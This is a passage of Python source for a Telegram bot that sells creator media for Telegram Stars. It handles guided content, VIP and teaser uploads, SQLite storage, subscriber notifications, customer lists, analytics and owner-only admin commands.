description.\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup(row_width=2)\n            markup.add(\n                types.InlineKeyboardButton(\"⏭️ Skip Description\", callback_data=\"skip_description\"),\n                types.InlineKeyboardButton(\"❌ Cancel Upload\", callback_data=\"cancel_upload\")\n            )\n            \n            bot.send_message(message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')\n            \n        except ValueError:\n            bot.send_message(message.chat.id, \"❌ Invalid price! Enter just the number (e.g., 25)\")\n    \n    elif session['step'] == 'waiting_for_description':\n        description = message.text.strip()\n        if description.lower() == 'skip':\n            description = f\"Exclusive {session.get('file_type', 'content').lower()} content\"\n        \n        session['description'] = description\n        \n        # Save content to database\n        save_uploaded_content(session)\n\ndef save_uploaded_content(session):\n    \"\"\"Save the uploaded content to database and finish the flow with automatic URL processing\"\"\"\n    try:\n        # Check if this is VIP content\n        content_type = session.get('content_type', 'browse')\n        \n        # Process external URLs automatically before saving\n        processed_file_path = session['file_path']\n        file_type_info = \"\"\n        url_conversion_note = \"\"\n        \n        if session['file_path'] and session['file_path'].startswith('http'):\n            # It's an external URL - download and convert to Telegram file_id\n            bot.send_message(OWNER_ID, f\"🔗 External URL detected in guided upload! Converting to permanent Telegram file_id...\\n\\n📥 URL: {session['file_path']}\")\n            \n            success, result, file_type = download_and_upload_image(session['file_path'], OWNER_ID)\n            \n            if success:\n                processed_file_path = result  # This is now the Telegram file_id\n                file_type_info = f\" ({file_type.title()})\"\n                url_conversion_note = \"\\n\\n🔄 **URL Conversion:** Original external URL was automatically converted to a permanent Telegram file_id to prevent hotlinking issues!\"\n                bot.send_message(OWNER_ID, f\"🎉 URL successfully converted to permanent Telegram file_id!\\n\\n✅ New File ID: {result[:50]}...\")\n            else:\n                # Download failed - notify user and don't save\n                error_message = f\"\"\"💥 **URL Processing Failed!**\n\n{result}\n\n🔍 **What happened:** The external URL could not be downloaded and converted to a Telegram file_id.\n\n📋 **Content Details:**\n• Name: {session['name']}\n• Price: {session['price']:,} Stars\n• Description: {session['description']}\n• Failed URL: {session['file_path']}\n\n🛠️ **Next Steps:**\n• Try uploading the file directly instead of using a URL\n• Use a different image URL that allows downloading\n• Check if the URL is accessible and points to an image file\"\"\"\n                \n                bot.send_message(OWNER_ID, error_message)\n                \n                # Clear upload session since we can't proceed\n                if OWNERS[0] in upload_sessions:\n                    del upload_sessions[OWNERS[0]]\n                return\n        \n        # Save to database (with processed file_path)\n        conn = sqlite3.connect('content_bot.db')\n        cursor = conn.cursor()\n        \n        cursor.execute('''\n            INSERT INTO content_items (name, price_stars, file_path, description, created_date, content_type)\n            VALUES (?, ?, ?, ?, ?, ?)\n        ''', (session['name'], session['price'], processed_file_path, session['description'], datetime.datetime.now().isoformat(), content_type))\n        conn.commit()\n        conn.close()\n        \n        # Success message\n        if content_type == 'vip':\n            success_text = f\"\"\"\n💎 <b>VIP CONTENT ADDED SUCCESSFULLY!</b> 💎\n\n📦 <b>Name:</b> {session['name']}\n💰 <b>Price:</b> {session['price']:,} Stars\n📝 <b>Description:</b> {session['description']}\n📁 <b>Type:</b> {session.get('file_type', 'File')}{file_type_info} (VIP Exclusive)\n\n🎉 Your VIP content is now live! VIP members get FREE access.\nNon-VIP users can purchase VIP subscriptions to access this content.\n\n💡 VIP content generates higher revenue through subscriptions!{url_conversion_note}\n\"\"\"\n        else:\n            success_text = f\"\"\"\n🎉 <b>CONTENT ADDED SUCCESSFULLY!</b> 🎉\n\n📦 <b>Name:</b> {session['name']}\n💰 <b>Price:</b> {session['price']:,} Stars\n📝 <b>Description:</b> {session['description']}\n📁 <b>Type:</b> {session.get('file_type', 'File')}{file_type_info}\n\nYour content is now available for purchase! Fans can buy it using:\n• The browse content menu\n• /buy {session['name']} command\n\n🛒 Content will be delivered automatically after payment.{url_conversion_note}\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        if content_type == 'vip':\n            markup.add(types.InlineKeyboardButton(\"💎 Add More VIP Content\", callback_data=\"start_vip_upload\"))\n            markup.add(types.InlineKeyboardButton(\"📊 VIP Dashboard\", callback_data=\"cmd_vip\"))\n        else:\n            markup.add(types.InlineKeyboardButton(\"📦 Add Another\", callback_data=\"start_upload\"))\n            markup.add(types.InlineKeyboardButton(\"👥 View Users\", callback_data=\"owner_list_users\"))\n        \n        bot.send_message(OWNER_ID, success_text, reply_markup=markup, parse_mode='HTML')\n        \n        # Clear upload session\n        if OWNERS[0] in upload_sessions:\n            del upload_sessions[OWNERS[0]]\n            \n    except Exception as e:\n        bot.send_message(OWNER_ID, f\"❌ Error saving content: {str(e)}\")\n        if OWNERS[0] in upload_sessions:\n            del upload_sessions[OWNERS[0]]\n\n@bot.message_handler(commands=['owner_upload_vip_teaser'])\ndef owner_upload_vip_teaser(message):\n    \"\"\"Handle /owner_upload_vip_teaser command - guided VIP teaser upload flow\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    start_vip_teaser_upload_session(message.chat.id, message.from_user.id)\n\n@bot.message_handler(commands=['owner_upload_teaser'])\ndef owner_upload_teaser(message):\n    \"\"\"Handle /owner_upload_teaser command - guided teaser upload flow\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    # Start teaser upload session\n    upload_sessions[OWNERS[0]] = {\n        'type': 'teaser',\n        'step': 'waiting_for_file',\n        'data': {}\n    }\n    \n    upload_text = \"\"\"\n🎬 **TEASER UPLOAD** 🎬\n\n📤 Send me the photo or video you want to use as a teaser.\n\nThis will be shown to non-VIP users when they use /teaser command.\n\n💡 Tips:\n• Upload high-quality images or short videos\n• Keep it enticing but not revealing everything\n• This builds anticipation for your full content\n\n📱 Just send the file when ready!\n\"\"\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"cancel_teaser_upload\"))\n    \n    bot.send_message(message.chat.id, upload_text, reply_markup=markup)\n\n@bot.message_handler(content_types=['photo', 'video', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')\ndef handle_vip_upload_files(message):\n    \"\"\"Handle VIP content file uploads - photos, videos, and animations only\"\"\"\n    logger.info(f\"VIP upload handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}\")\n    \n    # Get file information\n    file_id = None\n    file_type = None\n    \n    if message.content_type == 'photo':\n        file_id = message.photo[-1].file_id  # Get highest resolution\n        file_type = \"Photo\"\n    elif message.content_type == 'video':\n        file_id = message.video.file_id\n        file_type = \"Video\"\n    elif message.content_type == 'animation':\n        file_id = message.animation.file_id\n        file_type = \"GIF\"\n    \n    if file_id and file_type:\n        handle_vip_file_upload(message, file_id, file_type)\n    else:\n        bot.send_message(message.chat.id, \"❌ Unsupported file type for VIP content. Please send photos, videos, or GIFs only.\")\n\n@bot.message_handler(content_types=['photo', 'video', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_file_update' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')\ndef handle_vip_file_update_upload(message):\n    \"\"\"Handle VIP file update uploads - replace existing file\"\"\"\n    logger.info(f\"VIP file update handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}\")\n    \n    # Get file information\n    file_id = None\n    file_type = None\n    \n    if message.content_type == 'photo':\n        file_id = message.photo[-1].file_id  # Get highest resolution\n        file_type = \"Photo\"\n    elif message.content_type == 'video':\n        file_id = message.video.file_id\n        file_type = \"Video\"\n    elif message.content_type == 'animation':\n        file_id = message.animation.file_id\n        file_type = \"GIF\"\n    \n    if file_id and file_type:\n        session = upload_sessions[OWNERS[0]]\n        content_name = session['content_name']\n        \n        # Update the VIP content file path directly\n        conn = get_db_connection()\n        cursor = conn.cursor()\n        cursor.execute('UPDATE content_items SET file_path = ? WHERE name = ? AND content_type = ?', \n                      (file_id, content_name, 'vip'))\n        updated_count = cursor.rowcount\n        conn.commit()\n        conn.close()\n        \n        # Clear upload session\n        del upload_sessions[OWNERS[0]]\n        \n        if updated_count > 0:\n            success_text = f\"\"\"\n✅ <b>FILE UPDATED SUCCESSFULLY!</b> ✅\n\n<b>VIP Content:</b> {content_name}\n<b>New File:</b> {file_type}\n\n🎉 The file has been replaced and VIP members will now see the new content!\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"✏️ Edit Content Again\", callback_data=f\"vip_edit_{content_name}\"))\n            markup.add(types.InlineKeyboardButton(\"📋 Back to VIP Management\", callback_data=\"vip_manage_content\"))\n            \n            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(message.chat.id, f\"❌ Failed to update file for '{content_name}'. Please try again.\")\n    else:\n        bot.send_message(message.chat.id, \"❌ Unsupported file type for VIP content. Please send photos, videos, or GIFs only.\")\n\n@bot.message_handler(content_types=['photo', 'video'], func=lambda message: message.from_user.id == OWNER_ID and f\"{OWNER_ID}_vip_teaser\" in upload_sessions and upload_sessions[f\"{OWNER_ID}_vip_teaser\"].get('type') == 'vip_teaser' and upload_sessions[f\"{OWNER_ID}_vip_teaser\"].get('step') == 'waiting_for_file')\ndef handle_vip_teaser_upload(message):\n    \"\"\"Handle VIP teaser file upload from owner\"\"\"\n    teaser_key = f\"{OWNER_ID}_vip_teaser\"\n    logger.info(f\"VIP teaser handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(teaser_key, 'None')}\")\n    session = upload_sessions[teaser_key]\n    \n    if session['step'] == 'waiting_for_file':\n        # Store file information\n        file_id = None\n        file_type = None\n        \n        if message.photo:\n            file_id = message.photo[-1].file_id  # Get highest resolution\n            file_type = 'photo'\n            session['file_type'] = 'photo'\n        elif message.video:\n            file_id = message.video.file_id\n            file_type = 'video'\n            session['file_type'] = 'video'\n        \n        if file_id and file_type:\n            # Store file info and move to description step\n            session['file_path'] = file_id\n            session['step'] = 'waiting_for_description'\n            \n            # Generate default name with timestamp\n            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')\n            default_name = f\"vip_{file_type}_{timestamp}\"\n            session['name'] = default_name\n            \n            desc_text = f\"\"\"\n✅ <b>VIP TEASER FILE RECEIVED!</b> ✅\n\n📱 <b>File Type:</b> {file_type.title()}\n🎯 <b>Default Name:</b> {default_name}\n\n📤 <b>Step 2: Description</b>\nNow send me a description for this VIP teaser (optional).\n\n💡 <b>Description Tips:</b>\n• Make it exclusive and enticing for VIP members\n• Use personal language (\"Just for my VIPs...\")\n• Keep it engaging but not too long\n\n📝 Send your description or click \"Skip\" to use no description.\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"⏭ Skip Description\", callback_data=\"skip_vip_teaser_description\"))\n            markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"vip_teasers_management\"))\n            \n            bot.send_message(message.chat.id, desc_text, reply_markup=markup, parse_mode='HTML')\n        else:\n            bot.send_message(message.chat.id, \"❌ Please send a photo or video file for the VIP teaser.\")\n\n@bot.message_handler(content_types=['photo', 'video'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_teaser_edit' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')\ndef handle_vip_teaser_edit_upload(message):\n    \"\"\"Handle VIP teaser edit file upload from owner\"\"\"\n    session = upload_sessions[OWNERS[0]]\n    \n    # Store new file information\n    file_id = None\n    file_type = None\n    \n    if message.photo:\n        file_id = message.photo[-1].file_id\n        file_type = 'photo'\n    elif message.video:\n        file_id = message.video.file_id\n        file_type = 'video'\n    \n    if file_id and file_type:\n        # Update the teaser in database\n        try:\n            conn = sqlite3.connect('content_bot.db')\n            cursor = conn.cursor()\n            cursor.execute('''\n                UPDATE teasers \n                SET file_path = ?, file_type = ? \n                WHERE id = ? AND vip_only = 1\n            ''', (file_id, file_type, session['teaser_id']))\n            conn.commit()\n            conn.close()\n            \n            success_text = f\"\"\"\n✅ <b>VIP TEASER UPDATED SUCCESSFULLY!</b> ✅\n\n🎬 <b>New Type:</b> {file_type.title()}\n📝 <b>Description:</b> {session['old_description']}\n\n💎 Your VIP teaser has been updated! VIP members will now see the new content.\n\"\"\"\n            \n            markup = types.InlineKeyboardMarkup()\n            markup.add(types.InlineKeyboardButton(\"✏️ Edit Another\", callback_data=\"vip_teaser_edit\"))\n            markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n            \n            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')\n            \n        except Exception as e:\n            bot.send_message(message.chat.id, f\"❌ Error updating VIP teaser: {str(e)}\")\n        \n        # Clear upload session\n        if OWNERS[0] in upload_sessions:\n            del upload_sessions[OWNERS[0]]\n    else:\n        bot.send_message(message.chat.id, \"❌ Please send a photo or video file for the VIP teaser.\")\n\n@bot.message_handler(content_types=['photo', 'video', 'document', 'animation'], func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_file')\ndef handle_teaser_upload(message):\n    \"\"\"Handle teaser file upload from owner\"\"\"\n    logger.info(f\"Teaser handler triggered - Content type: {message.content_type}, Session: {upload_sessions.get(OWNER_ID, 'None')}\")\n    session = upload_sessions[OWNERS[0]]\n    \n    if session['step'] == 'waiting_for_file':\n        # Store file information\n        file_id = None\n        file_type = None\n        \n        if message.photo:\n            file_id = message.photo[-1].file_id  # Get highest resolution\n            file_type = 'photo'\n            session['file_type'] = 'photo'\n        elif message.video:\n            file_id = message.video.file_id\n            file_type = 'video'\n            session['file_type'] = 'video'\n        elif message.animation:\n            file_id = message.animation.file_id\n            file_type = 'gif'\n            session['file_type'] = 'gif'\n        elif message.document:\n            file_id = message.document.file_id\n            # Detect actual file type for documents\n            if hasattr(message.document, 'file_name') and message.document.file_name:\n                file_name = message.document.file_name.lower()\n                if file_name.endswith(('.mp4', '.mov', '.avi', '.mkv', '.webm')):\n                    file_type = 'video'\n                    session['file_type'] = 'video'\n                elif file_name.endswith(('.gif')):\n                    file_type = 'gif'\n                    session['file_type'] = 'gif'\n                elif file_name.endswith(('.jpg', '.jpeg', '.png', '.webp')):\n                    file_type = 'photo'\n                    session['file_type'] = 'photo'\n                else:\n                    file_type = None  # Unsupported document type\n            else:\n                # Check MIME type as fallback\n                mime_type = getattr(message.document, 'mime_type', '')\n                if mime_type.startswith('video/'):\n                    file_type = 'video'\n                    session['file_type'] = 'video'\n                elif mime_type == 'image/gif':\n                    file_type = 'gif'\n                    session['file_type'] = 'gif'\n                elif mime_type.startswith('image/'):\n                    file_type = 'photo'\n                    session['file_type'] = 'photo'\n                else:\n                    file_type = None  # Unsupported document type\n        \n        if file_id and file_type:\n            session['file_id'] = file_id\n            session['step'] = 'waiting_for_description'\n        else:\n            bot.send_message(message.chat.id, \"❌ Please send a photo, video, or GIF file. Supported formats: JPG, PNG, MP4, GIF, MOV, AVI.\")\n            return\n        \n        # Ask for description\n        desc_text = f\"\"\"\n✅ **{file_type.title()} received!**\n\n📝 Now send me a description for this teaser (what fans will see):\n\nExamples:\n• \"Behind the scenes sneak peek 😉\"\n• \"A little taste of what's coming...\"\n• \"Can't wait to show you the full version 💕\"\n\nType your description:\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"⏭ Skip Description\", callback_data=\"skip_teaser_description\"))\n        markup.add(types.InlineKeyboardButton(\"❌ Cancel\", callback_data=\"cancel_teaser_upload\"))\n        \n        bot.send_message(message.chat.id, desc_text, reply_markup=markup)\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_name')\ndef handle_vip_name_message(message):\n    \"\"\"Handle VIP content name input from message\"\"\"\n    handle_vip_name_input(message)\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'vip_content' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_description')\ndef handle_vip_description_message(message):\n    \"\"\"Handle VIP content description input from message\"\"\"\n    handle_vip_description_input(message)\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and f\"{OWNER_ID}_vip_teaser\" in upload_sessions and upload_sessions[f\"{OWNER_ID}_vip_teaser\"].get('type') == 'vip_teaser' and upload_sessions[f\"{OWNER_ID}_vip_teaser\"].get('step') == 'waiting_for_description')\ndef handle_vip_teaser_description(message):\n    \"\"\"Handle VIP teaser description from owner\"\"\"\n    teaser_key = f\"{OWNER_ID}_vip_teaser\"\n    session = upload_sessions[teaser_key]\n    description = message.text.strip()\n    \n    if description.lower() == 'skip':\n        description = \"Exclusive VIP teaser content\"\n    \n    # Save VIP teaser to database\n    try:\n        add_teaser(session['file_path'], session['file_type'], description, vip_only=True)\n        \n        # Send notifications to all VIP subscribers about the new VIP teaser\n        notification_stats = notify_vip_teaser_uploaded(description)\n        \n        success_text = f\"\"\"\n🎉 <b>VIP TEASER UPLOADED SUCCESSFULLY!</b> 🎉\n\n🎬 <b>Type:</b> {session['file_type'].title()}\n📝 <b>Description:</b> {description}\n\n💎 Your VIP teaser is now live! VIP members will see this exclusive content when they use /teaser.\n\n📱 <b>VIP Notifications Sent:</b>\n✅ Delivered to {notification_stats['sent']} VIP members\n🚫 {notification_stats['blocked']} users have blocked the bot\n❌ {notification_stats['failed']} delivery failures\n\n🔄 You can upload multiple VIP teasers - the most recent one will be shown first to VIP members.\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🎬 Upload Another VIP Teaser\", callback_data=\"vip_teaser_upload\"))\n        markup.add(types.InlineKeyboardButton(\"🔙 Back to VIP Teasers\", callback_data=\"vip_teasers_management\"))\n        \n        bot.send_message(OWNER_ID, success_text, reply_markup=markup, parse_mode='HTML')\n        \n    except Exception as e:\n        bot.send_message(OWNER_ID, f\"❌ Error saving VIP teaser: {str(e)}\")\n    \n    # Clear upload session\n    if teaser_key in upload_sessions:\n        del upload_sessions[teaser_key]\n\n@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'teaser' and upload_sessions[OWNER_ID].get('step') == 'waiting_for_description')\ndef handle_teaser_description(message):\n    \"\"\"Handle teaser description from owner\"\"\"\n    session = upload_sessions[OWNERS[0]]\n    description = message.text.strip()\n    \n    if description.lower() == 'skip':\n        description = \"Exclusive teaser content\"\n    \n    # Save teaser to database\n    try:\n        add_teaser(session['file_id'], session['file_type'], description)\n        \n        # Send notifications to all non-VIP users about the new free teaser\n        notification_stats = notify_free_teaser_uploaded(description)\n        \n        success_text = f\"\"\"\n🎉 <b>FREE TEASER UPLOADED SUCCESSFULLY!</b> 🎉\n\n🎬 <b>Type:</b> {session['file_type'].title()}\n📝 <b>Description:</b> {description}\n\n🎁 Your free teaser is now live! Non-VIP users will see this when they use /teaser.\n\n📱 <b>Free Teaser Notifications Sent:</b>\n✅ Delivered to {notification_stats['sent']} non-VIP users\n🚫 {notification_stats['blocked']} users have blocked the bot\n❌ {notification_stats['failed']} delivery failures\n\n🔄 You can upload multiple teasers - the most recent one will be shown first.\n\"\"\"\n        \n        markup = types.InlineKeyboardMarkup()\n        markup.add(types.InlineKeyboardButton(\"🎬 Upload Another Free Teaser\", callback_data=\"start_teaser_upload\"))\n        markup.add(types.InlineKeyboardButton(\"👥 View Customers\", callback_data=\"owner_list_users\"))\n        \n        bot.send_message(OWNER_ID, success_text, reply_markup=markup, parse_mode='HTML')\n        \n    except Exception as e:\n        bot.send_message(OWNER_ID, f\"❌ Error saving teaser: {str(e)}\")\n    \n    # Clear upload session\n    if OWNER_ID in upload_sessions:\n        del upload_sessions[OWNERS[0]]\n\n@bot.message_handler(commands=['owner_list_teasers'])\ndef owner_list_teasers(message):\n    \"\"\"Handle /owner_list_teasers command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    teasers = get_teasers_with_id()\n    \n    if not teasers:\n        bot.send_message(message.chat.id, \"📭 No teasers found. Upload your first teaser with /owner_upload_teaser!\")\n        return\n    \n    teaser_list = \"🎬 **YOUR TEASERS** 🎬\\n\\n\"\n    \n    for i, (teaser_id, file_path, file_type, description, created_date) in enumerate(teasers[:10]):\n        # Parse creation date\n        try:\n            date_obj = datetime.datetime.fromisoformat(created_date)\n            formatted_date = date_obj.strftime(\"%Y-%m-%d %H:%M\")\n        except:\n            formatted_date = created_date\n        \n        teaser_list += f\"**ID: {teaser_id}** | {file_type.title()}\\n\"\n        teaser_list += f\"📝 {description[:50]}{'...' if len(description) > 50 else ''}\\n\"\n        teaser_list += f\"📅 {formatted_date}\\n\"\n        teaser_list += f\"🗑️ Delete: `/owner_delete_teaser {teaser_id}`\\n\\n\"\n    \n    if len(teasers) > 10:\n        teaser_list += f\"... and {len(teasers) - 10} more teasers\\n\\n\"\n    \n    teaser_list += \"💡 **Tips:**\\n\"\n    teaser_list += \"• Most recent teaser is shown first to users\\n\"\n    teaser_list += \"• Use `/owner_delete_teaser [ID]` to remove a teaser\\n\"\n    teaser_list += \"• Upload new teasers with `/owner_upload_teaser`\"\n    \n    markup = types.InlineKeyboardMarkup()\n    markup.add(types.InlineKeyboardButton(\"🎬 Upload New Teaser\", callback_data=\"start_teaser_upload\"))\n    markup.add(types.InlineKeyboardButton(\"🔧 Owner Menu\", callback_data=\"owner_help\"))\n    \n    bot.send_message(message.chat.id, teaser_list, reply_markup=markup, parse_mode='Markdown')\n\n@bot.message_handler(commands=['owner_delete_teaser'])\ndef owner_delete_teaser_command(message):\n    \"\"\"Handle /owner_delete_teaser command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    parts = message.text.split(' ', 1)\n    if len(parts) < 2:\n        bot.send_message(message.chat.id, \"❌ Usage: /owner_delete_teaser [ID]\\n\\n💡 Use /owner_list_teasers to see teaser IDs.\")\n        return\n    \n    try:\n        teaser_id = int(parts[1])\n    except ValueError:\n        bot.send_message(message.chat.id, \"❌ Invalid teaser ID. Please provide a valid number.\\n\\n💡 Use /owner_list_teasers to see teaser IDs.\")\n        return\n    \n    success = delete_teaser(teaser_id)\n    \n    if success:\n        bot.send_message(message.chat.id, f\"✅ Teaser ID {teaser_id} deleted successfully!\")\n    else:\n        bot.send_message(message.chat.id, f\"❌ Teaser ID {teaser_id} not found.\")\n\n@bot.message_handler(commands=['owner_list_users'])\ndef owner_list_users(message):\n    \"\"\"Handle /owner_list_users command - show only paying customers\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    # Only show paying customers (total_stars_spent > 0) and exclude bot user ID\n    cursor.execute('''\n        SELECT u.user_id, u.username, u.first_name, u.total_stars_spent, u.interaction_count, \n               CASE WHEN l.user_id IS NOT NULL THEN 'Yes' ELSE 'No' END as is_loyal\n        FROM users u\n        LEFT JOIN loyal_fans l ON u.user_id = l.user_id\n        WHERE u.total_stars_spent > 0 AND u.user_id != ?\n        ORDER BY u.total_stars_spent DESC\n    ''', (bot.get_me().id,))\n    paying_customers = cursor.fetchall()\n    \n    # Get all customers stats for comparison\n    cursor.execute('SELECT COUNT(*), SUM(total_stars_spent) FROM users WHERE total_stars_spent > 0 AND user_id != ?', (bot.get_me().id,))\n    total_paying_customers, total_revenue = cursor.fetchone()\n    \n    conn.close()\n    \n    if paying_customers:\n        user_text = \"💰 <b>PAYING CUSTOMERS</b> 💰\\n\\n\"\n        \n        user_text += f\"👥 Total Paying Customers: {total_paying_customers or 0}\\n\"\n        user_text += f\"💰 Total Revenue: {total_revenue or 0} Stars\\n\"\n        user_text += f\"📈 Average Revenue per Customer: {(total_revenue or 0) / max(total_paying_customers or 1, 1):.1f} Stars\\n\\n\"\n        \n        for user_id, username, first_name, stars_spent, interactions, is_loyal in paying_customers[:15]:  # Show top 15\n            # Escape HTML characters in usernames to prevent parsing errors\n            safe_username = (username or 'none').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            safe_first_name = (first_name or 'N/A').replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')\n            user_text += f\"👤 {safe_first_name} (@{safe_username})\\n\"\n            user_text += f\"   💰 {stars_spent} Stars | 💬 {interactions} interactions\"\n            if is_loyal == 'Yes':\n                user_text += \" | ⭐ LOYAL\"\n            user_text += f\"\\n   🆔 ID: {user_id}\\n\\n\"\n        \n        if len(paying_customers) > 15:\n            user_text += f\"... and {len(paying_customers) - 15} more paying customers\"\n        \n        bot.send_message(message.chat.id, user_text, parse_mode='HTML')\n    else:\n        bot.send_message(message.chat.id, \"💰 No paying customers yet. Share your content to start earning! 🚀\")\n\n@bot.message_handler(commands=['owner_analytics'])\ndef owner_analytics(message):\n    \"\"\"Handle /owner_analytics command - show accurate analytics for paying customers only\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    \n    # Get paying customers statistics (exclude bot)\n    cursor.execute('SELECT COUNT(*), SUM(total_stars_spent), SUM(interaction_count) FROM users WHERE total_stars_spent > 0 AND user_id != ?', (bot.get_me().id,))\n    paying_customers, total_revenue, paying_interactions = cursor.fetchone()\n    \n    # Get all users statistics for comparison (exclude bot)\n    cursor.execute('SELECT COUNT(*), SUM(interaction_count) FROM users WHERE user_id != ?', (bot.get_me().id,))\n    total_users, total_interactions = cursor.fetchone()\n    \n    # Get top spenders (only paying customers)\n    cursor.execute('SELECT first_name, username, total_stars_spent FROM users WHERE total_stars_spent > 0 AND user_id != ? ORDER BY total_stars_spent DESC LIMIT 5', (bot.get_me().id,))\n    top_spenders = cursor.fetchall()\n    \n    # Get content performance\n    cursor.execute('SELECT name, price_stars FROM content_items')\n    content_items = cursor.fetchall()\n    \n    conn.close()\n    \n    # Calculate conversion rate\n    conversion_rate = (paying_customers / max(total_users or 1, 1)) * 100 if total_users else 0\n    \n    analytics_text = f\"\"\"\n📈 **ANALYTICS DASHBOARD** 📈\n\n📊 **Overall Stats:**\n👥 Total Visitors: {total_users or 0}\n💰 Paying Customers: {paying_customers or 0}\n📈 Conversion Rate: {conversion_rate:.1f}%\n💰 Total Revenue: {total_revenue or 0} Stars\n📱 Average per Customer: {(total_revenue or 0) / max(paying_customers or 1, 1):.1f} Stars\n\n🏆 **Top Spenders:**\n\"\"\"\n    \n    if top_spenders:\n        for i, (first_name, username, spent) in enumerate(top_spenders, 1):\n            analytics_text += f\"{i}. {first_name or 'N/A'} (@{username or 'none'}): {spent} Stars\\n\"\n    else:\n        analytics_text += \"No paying customers yet.\\n\"\n    \n    analytics_text += f\"\\n🛒 **Content Catalog:**\\n\"\n    analytics_text += f\"📦 Total Items: {len(content_items)}\\n\"\n    \n    if content_items:\n        avg_price = sum(price for _, price in content_items) / len(content_items)\n        analytics_text += f\"💰 Average Price: {avg_price:.1f} Stars\"\n    \n    bot.send_message(message.chat.id, analytics_text, parse_mode='Markdown')\n\n@bot.message_handler(commands=['owner_set_response'])\ndef owner_set_response(message):\n    \"\"\"Handle /owner_set_response command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    parts = message.text.split(' ', 2)\n    if len(parts) < 3:\n        bot.send_message(message.chat.id, \"❌ Usage: /owner_set_response [key] [text]\\nKeys: greeting, question, compliment, default\")\n        return\n    \n    key = parts[1]\n    text = parts[2]\n    \n    valid_keys = ['greeting', 'question', 'compliment', 'default']\n    if key not in valid_keys:\n        bot.send_message(message.chat.id, f\"❌ Invalid key. Valid keys: {', '.join(valid_keys)}\")\n        return\n    \n    conn = sqlite3.connect('content_bot.db')\n    cursor = conn.cursor()\n    cursor.execute('INSERT OR REPLACE INTO responses (key, text) VALUES (?, ?)', (key, text))\n    conn.commit()\n    conn.close()\n    \n    bot.send_message(message.chat.id, f\"✅ AI response for '{key}' updated successfully!\")\n\n\n@bot.message_handler(commands=['owner_help'])\ndef owner_help(message):\n    \"\"\"Handle /owner_help command\"\"\"\n    if not is_owner(message.from_user.id):\n        bot.send_message(message.chat.id, \"❌ Access denied. This is an owner-only command.\")\n        return\n    \n    help_text = \"\"\"\n🔧 **OWNER COMMANDS** 🔧\n\n💎 **VIP Management:**\n• `/vip` - VIP content management dashboard\n• VIP content is exclusive to VIP subscribers only\n• VIP members get FREE access to all VIP content\n• Higher revenue potential through monthly subscriptions\n• Focus here first for maximum profitability!\n\n📦 **Content Management:**\n• `/owner_upload` - Guided file upload (photos/videos/documents)\n• `/owner_add_content [name] [price] [url] [description]` - Add content via URL\n• `/owner_delete_content [name]` - Remove content\n\n🎬 **Teaser Management:**\n• `/owner_upload_teaser` - Upload teasers for non-VIP users\n• `/owner_list_teasers` - View all uploaded teasers\n• `/owner_delete_teaser [ID]` - Delete teaser by 